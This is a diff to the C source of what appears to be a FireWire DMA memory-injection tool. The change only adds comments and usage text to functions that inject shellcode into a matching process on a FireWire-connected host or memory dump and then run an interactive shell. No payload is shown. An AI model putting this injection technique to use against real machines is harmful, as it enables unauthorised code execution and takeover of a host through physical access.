@@ -208,6 +208,7 @@ uint32_t try_inject(linear_handle lin, addr_t pagedir, char *injectcode, int inj
 
 volatile int do_terminate = 0;
 
+// set STDIN to blocking mode
 void set_blocking_stdin()
 {{{
 	int flags;
@@ -217,6 +218,7 @@ void set_blocking_stdin()
 	fcntl(STDIN_FILENO, F_SETFL, flags);
 }}}
 
+// set STDIN to non-blocking mode
 void set_nonblocking_stdin()
 {{{
 	int flags;
@@ -226,6 +228,8 @@ void set_nonblocking_stdin()
 	fcntl(STDIN_FILENO, F_SETFL, flags);
 }}}
 
+// show user some options and ask for his choice
+// (thinks like kill shell, reset firewire bus, rescan for process, ...
 void handle_sigint(int __attribute__ ((__unused__)) signal)
 {{{
 	set_blocking_stdin();
@@ -270,6 +274,8 @@ void handle_sigint(int __attribute__ ((__unused__)) signal)
 	set_nonblocking_stdin();
 }}}
 
+// search the shellcodes process once again (a fork may relocate the pagedirectory)
+// then interact with the shellcode
 void use_shell(linear_handle lin, uint32_t base)
 {{{
 	// these depend on the used shellcode:
@@ -363,16 +369,21 @@ void use_shell(linear_handle lin, uint32_t base)
 	set_blocking_stdin();
 }}}
 
+// print usage information
 void usage(char* argv0)
 {{{
 	printf( "%s [-] <"TERM_YELLOW"-n nodeid"TERM_RESET"|"TERM_YELLOW"-f filename"TERM_RESET"> -b <binary>\n"
 		"\ninject -c <codefile> into first process matching the -b <binary>\n"
 		"\t\tgive -p to pretend (then i will not write anything, only read)\n"
 		"\t\t* the host connected via firewire with the given nodeid\n"
-		"\t\t* the memory dump in the given file\n",
+		"\t\t* the memory dump in the given file\n"
+		"\tuse CTRL-C (SIGINT) in interactive-shell-mode for a special menu\n"
+		"\tuse CTRL-\\ (SIGQUIT) in interactive-shell-mode\n"
+		"\t\tto stop the program without further notice or writes\n",
 		argv0);
 }}}
 
+// search the given process, inject shellcode and then call use_shell()
 int main(int argc, char**argv)
 {{{
 	physical_handle phy;
